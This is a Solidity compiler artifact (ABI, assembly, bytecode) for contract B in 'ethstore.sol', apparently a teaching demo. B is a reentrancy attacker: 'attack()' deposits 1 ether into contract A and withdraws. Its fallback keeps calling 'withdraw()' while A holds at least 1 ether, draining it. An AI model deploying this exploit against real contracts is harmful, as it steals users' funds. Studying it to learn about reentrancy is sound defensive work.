{
	"contracts/Dapps/ethstore.sol": {
		"B": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_aAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "a",
					"outputs": [
						{
							"internalType": "contract A",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Dapps/ethstore.sol\":654:1120  contract B {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Dapps/ethstore.sol\":687:751  constructor(address _aAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  0x40\n  dup2\n  swap1\n  mstore\n  tag_2\n  swap2\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Dapps/ethstore.sol\":728:729  a */\n  0x00\n    /* \"contracts/Dapps/ethstore.sol\":728:744  a = A(_aAddress) */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n  swap3\n  swap1\n  swap3\n  and\n  swap2\n  swap1\n  swap2\n  or\n  swap1\n  sstore\n    /* \"contracts/Dapps/ethstore.sol\":654:1120  contract B {... */\n  jump(tag_7)\n    /* \"#utility.yul\":14:304   */\ntag_3:\n    /* \"#utility.yul\":84:90   */\n  0x00\n    /* \"#utility.yul\":137:139   */\n  0x20\n    /* \"#utility.yul\":125:134   */\n  dup3\n    /* \"#utility.yul\":116:123   */\n  dup5\n    /* \"#utility.yul\":112:135   */\n  sub\n    /* \"#utility.yul\":108:140   */\n  slt\n    /* \"#utility.yul\":105:157   */\n  iszero\n  tag_9\n  jumpi\n    /* \"#utility.yul\":153:154   */\n  0x00\n    /* \"#utility.yul\":150:151   */\n  dup1\n    /* \"#utility.yul\":143:155   */\n  revert\n    /* \"#utility.yul\":105:157   */\ntag_9:\n    /* \"#utility.yul\":179:195   */\n  dup2\n  mload\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"#utility.yul\":224:255   */\n  dup2\n  and\n    /* \"#utility.yul\":214:256   */\n  dup2\n  eq\n    /* \"#utility.yul\":204:274   */\n  tag_10\n  jumpi\n    /* \"#utility.yul\":270:271   */\n  0x00\n    /* \"#utility.yul\":267:268   */\n  dup1\n    /* \"#utility.yul\":260:272   */\n  revert\n    /* \"#utility.yul\":204:274   */\ntag_10:\n    /* \"#utility.yul\":293:298   */\n  swap4\n    /* \"#utility.yul\":14:304   */\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\ntag_7:\n    /* \"contracts/Dapps/ethstore.sol\":654:1120  contract B {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Dapps/ethstore.sol\":654:1120  contract B {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0dbe671f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x12065fe0\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_5\n      jumpi\n    tag_1:\n        /* \"contracts/Dapps/ethstore.sol\":806:807  a */\n      sload(0x00)\n        /* \"contracts/Dapps/ethstore.sol\":819:826  1 ether */\n      0x0de0b6b3a7640000\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Dapps/ethstore.sol\":806:807  a */\n      swap1\n      swap2\n      and\n        /* \"contracts/Dapps/ethstore.sol\":798:816  address(a).balance */\n      balance\n        /* \"contracts/Dapps/ethstore.sol\":798:826  address(a).balance >=1 ether */\n      lt\n        /* \"contracts/Dapps/ethstore.sol\":795:864  if(address(a).balance >=1 ether){... */\n      tag_8\n      jumpi\n        /* \"contracts/Dapps/ethstore.sol\":841:842  a */\n      0x00\n      dup1\n      sload\n        /* \"contracts/Dapps/ethstore.sol\":841:853  a.withdraw() */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x3ccfd60b)\n      dup2\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Dapps/ethstore.sol\":841:842  a */\n      swap1\n      swap3\n      and\n      swap3\n        /* \"contracts/Dapps/ethstore.sol\":841:851  a.withdraw */\n      0x3ccfd60b\n      swap3\n        /* \"contracts/Dapps/ethstore.sol\":841:853  a.withdraw() */\n      0x04\n      dup1\n      dup5\n      add\n      swap4\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"contracts/Dapps/ethstore.sol\":841:842  a */\n      dup4\n      dup8\n        /* \"contracts/Dapps/ethstore.sol\":841:853  a.withdraw() */\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_11:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Dapps/ethstore.sol\":795:864  if(address(a).balance >=1 ether){... */\n    tag_8:\n        /* \"contracts/Dapps/ethstore.sol\":654:1120  contract B {... */\n      stop\n        /* \"contracts/Dapps/ethstore.sol\":671:681  A public a */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      sload(0x00)\n      tag_13\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      jump\n    tag_13:\n      mload(0x40)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":186:241   */\n      swap1\n      swap2\n      and\n        /* \"#utility.yul\":168:242   */\n      dup2\n      mstore\n        /* \"#utility.yul\":156:158   */\n      0x20\n        /* \"#utility.yul\":141:159   */\n      add\n        /* \"contracts/Dapps/ethstore.sol\":671:681  A public a */\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Dapps/ethstore.sol\":1024:1118  function getBalance() public view returns(uint) {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      mload(0x40)\n        /* \"contracts/Dapps/ethstore.sol\":1089:1110  address(this).balance */\n      selfbalance\n        /* \"#utility.yul\":399:424   */\n      dup2\n      mstore\n        /* \"#utility.yul\":387:389   */\n      0x20\n        /* \"#utility.yul\":372:390   */\n      add\n        /* \"contracts/Dapps/ethstore.sol\":1024:1118  function getBalance() public view returns(uint) {... */\n      tag_15\n        /* \"#utility.yul\":253:430   */\n      jump\n        /* \"contracts/Dapps/ethstore.sol\":878:1017  function attack() external payable {... */\n    tag_5:\n      tag_8\n        /* \"contracts/Dapps/ethstore.sol\":943:950  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/Dapps/ethstore.sol\":931:940  msg.value */\n      callvalue\n        /* \"contracts/Dapps/ethstore.sol\":931:950  msg.value >=1 ether */\n      lt\n      iszero\n        /* \"contracts/Dapps/ethstore.sol\":923:951  require(msg.value >=1 ether) */\n      tag_26\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_26:\n        /* \"contracts/Dapps/ethstore.sol\":961:962  a */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Dapps/ethstore.sol\":961:970  a.deposit */\n      and\n      0xd0e30db0\n        /* \"contracts/Dapps/ethstore.sol\":977:984  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/Dapps/ethstore.sol\":961:987  a.deposit{value:1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_27:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_29:\n      pop\n      pop\n        /* \"contracts/Dapps/ethstore.sol\":997:998  a */\n      0x00\n      dup1\n      sload\n        /* \"contracts/Dapps/ethstore.sol\":997:1009  a.withdraw() */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x3ccfd60b)\n      dup2\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Dapps/ethstore.sol\":997:998  a */\n      swap1\n      swap3\n      and\n      swap6\n      pop\n        /* \"contracts/Dapps/ethstore.sol\":997:1007  a.withdraw */\n      0x3ccfd60b\n      swap5\n      pop\n        /* \"contracts/Dapps/ethstore.sol\":997:1009  a.withdraw() */\n      0x04\n      dup1\n      dup3\n      add\n      swap5\n      pop\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"contracts/Dapps/ethstore.sol\":997:998  a */\n      dup4\n      dup8\n        /* \"contracts/Dapps/ethstore.sol\":997:1009  a.withdraw() */\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_30\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_30:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_32\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_32:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Dapps/ethstore.sol\":878:1017  function attack() external payable {... */\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220d12e78709630a5d67a29cddf354c92fafd4eabb782e6028b0d01c91c0fe218e664736f6c63430008150033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b5060405161029738038061029783398101604081905261002e91610052565b5f80546001600160a01b0319166001600160a01b039290921691909117905561007f565b5f60208284031215610062575f80fd5b81516001600160a01b0381168114610078575f80fd5b9392505050565b61020b8061008c5f395ff3fe608060405260043610610033575f3560e01c80630dbe671f146100a757806312065fe0146100e25780639e5faafc146100fc575b5f54670de0b6b3a76400006001600160a01b0390911631106100a5575f805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561008e575f80fd5b505af11580156100a0573d5f803e3d5ffd5b505050505b005b3480156100b2575f80fd5b505f546100c5906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b3480156100ed575f80fd5b506040514781526020016100d9565b6100a5670de0b6b3a7640000341015610113575f80fd5b5f8054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610166575f80fd5b505af1158015610178573d5f803e3d5ffd5b50505f805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b1580156101bd575f80fd5b505af11580156101cf573d5f803e3d5ffd5b5050505056fea2646970667358221220d12e78709630a5d67a29cddf354c92fafd4eabb782e6028b0d01c91c0fe218e664736f6c63430008150033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x297 CODESIZE SUB DUP1 PUSH2 0x297 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH2 0x2E SWAP2 PUSH2 0x52 JUMP JUMPDEST PUSH0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE PUSH2 0x7F JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x62 JUMPI PUSH0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x78 JUMPI PUSH0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH2 0x20B DUP1 PUSH2 0x8C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x33 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xDBE671F EQ PUSH2 0xA7 JUMPI DUP1 PUSH4 0x12065FE0 EQ PUSH2 0xE2 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xFC JUMPI JUMPDEST PUSH0 SLOAD PUSH8 0xDE0B6B3A7640000 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND BALANCE LT PUSH2 0xA5 JUMPI PUSH0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x3CCFD60B PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP3 PUSH4 0x3CCFD60B SWAP3 PUSH1 0x4 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x8E JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xA0 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB2 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH0 SLOAD PUSH2 0xC5 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xED JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SELFBALANCE DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xD9 JUMP JUMPDEST PUSH2 0xA5 PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x113 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x166 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x178 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP PUSH0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x3CCFD60B PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP6 POP PUSH4 0x3CCFD60B SWAP5 POP PUSH1 0x4 DUP1 DUP3 ADD SWAP5 POP SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1BD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1CF JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD1 0x2E PUSH25 0x709630A5D67A29CDDF354C92FAFD4EABB782E6028B0D01C91C 0xF 0xE2 XOR 0xE6 PUSH5 0x736F6C6343 STOP ADDMOD ISZERO STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "104600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"a()": "2302",
						"attack()": "infinite",
						"getBalance()": "178"
					}
				},
				"methodIdentifiers": {
					"a()": "0dbe671f",
					"attack()": "9e5faafc",
					"getBalance()": "12065fe0"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 72,
						"contract": "contracts/Dapps/ethstore.sol:B",
						"label": "a",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(A)69"
					}
				],
				"types": {
					"t_contract(A)69": {
						"encoding": "inplace",
						"label": "contract A",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}